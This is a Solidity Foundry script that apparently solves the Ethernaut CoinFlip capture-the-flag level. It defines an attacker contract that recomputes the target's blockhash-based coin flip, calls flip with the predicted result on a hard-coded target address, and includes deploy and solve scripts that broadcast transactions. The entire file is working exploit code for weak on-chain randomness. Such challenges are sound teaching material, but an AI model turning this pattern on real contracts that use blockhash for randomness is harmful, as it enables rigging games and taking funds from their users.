// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

interface ICoinFlip {
  function flip(bool guess) external returns (bool);

  function consecutiveWins() external returns (uint256);
}

contract HackScript is Test {
  address target = address(0x79872eceA429132507Aae71579bEa1aCb3947349);
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  uint256 wins;

  ICoinFlip coin = ICoinFlip(target);

  function getOutcome() public view returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    return side;
  }

  constructor() {
    wins = coin.consecutiveWins();
  }

  function hack() external {
    require(coin.flip(getOutcome()), "Flip failed");
    require(wins + 1 == coin.consecutiveWins(), "Wins did not increase");
    wins += 1;
    console.log("New wins is %s", coin.consecutiveWins());
  }
}

contract DeployHack is Script {
  function run() public {
    vm.startBroadcast();

    HackScript hack = new HackScript();
    console.log("Hack deployed to %s", address(hack));

    vm.stopBroadcast();
  }
}

contract Solve is Script, Test {
  HackScript hack = HackScript(0xF62BD07e289B05B38e05bB82073C0aBA6b011617);

  function run() public {
    vm.startBroadcast();

    hack.hack();

    vm.stopBroadcast();
  }
}
